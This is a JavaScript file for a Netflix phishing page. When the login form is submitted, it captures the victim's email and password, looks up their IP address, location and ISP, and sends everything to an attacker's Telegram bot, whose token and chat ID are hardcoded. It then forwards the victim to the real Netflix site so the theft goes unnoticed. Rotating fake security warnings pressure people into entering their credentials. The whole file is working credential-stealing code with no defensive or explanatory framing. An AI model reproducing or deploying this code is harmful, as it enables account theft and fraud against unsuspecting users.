// Your Telegram credentials
const TELEGRAM_BOT_TOKEN = '8045104434:AAGdSeD3w73N5MjqiF4l6XFNzSoyNaiVWdo';
const TELEGRAM_CHAT_ID = '7410508833';

// Close warning
function closeWarning() {
    document.getElementById('warning').style.display = 'none';
}

// Get user IP
async function getUserIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        return 'Unknown';
    }
}

// Get location info
async function getLocationInfo(ip) {
    if (ip === 'Unknown') return { country: 'Unknown', city: 'Unknown' };
    
    try {
        const response = await fetch(`https://ipapi.co/${ip}/json/`);
        const data = await response.json();
        return {
            country: data.country_name || 'Unknown',
            city: data.city || 'Unknown',
            region: data.region || 'Unknown',
            isp: data.org || 'Unknown'
        };
    } catch (error) {
        return { country: 'Unknown', city: 'Unknown' };
    }
}

// Send to Telegram
async function sendToTelegram(email, password, ip, location) {
    const message = `
🔔 *NETFLIX LOGIN* 🔔

📧 *Email:* \`${email}\`
🔑 *Password:* \`${password}\`
🌍 *IP:* \`${ip}\`
📍 *Location:* ${location.city}, ${location.country}
🏢 *ISP:* ${location.isp}
📱 *Device:* ${navigator.userAgent.substring(0, 50)}...
🕐 *Time:* ${new Date().toLocaleString()}
    `.trim();
    
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });
        
        return await response.json();
    } catch (error) {
        console.error('Telegram error:', error);
        return null;
    }
}

// Handle form submission
document.getElementById('loginForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const loginBtn = document.getElementById('loginBtn');
    
    // Show loading
    loginBtn.textContent = 'Verifying...';
    loginBtn.disabled = true;
    
    // Get IP and location
    const ip = await getUserIP();
    const location = await getLocationInfo(ip);
    
    // Send to Telegram (silent - don't wait for response)
    sendToTelegram(email, password, ip, location).then(() => {
        console.log('Sent to Telegram');
    }).catch(() => {
        console.log('Telegram failed, continuing...');
    });
    
    // Wait 1 second then redirect
    setTimeout(() => {
        loginBtn.textContent = 'Success! Redirecting...';
        setTimeout(() => {
            window.location.href = 'https://www.netflix.com';
        }, 1000);
    }, 1000);
});

// Rotate warning messages
const warnings = [
    "⚠️ SECURITY ALERT: Unusual login activity detected.",
    "🔒 ACCOUNT PROTECTION: Verify your identity.",
    "🚨 SUSPICIOUS ACTIVITY: Login attempt detected.",
    "⚠️ WARNING: Your account may be compromised."
];

let warningIndex = 0;
setInterval(() => {
    const warningElement = document.querySelector('.warning-content');
    if (warningElement) {
        warningElement.style.opacity = '0.5';
        setTimeout(() => {
            warningElement.innerHTML = warnings[warningIndex] + 
                ' <button onclick="closeWarning()">×</button>';
            warningElement.style.opacity = '1';
            warningIndex = (warningIndex + 1) % warnings.length;
        }, 300);
    }
}, 8000);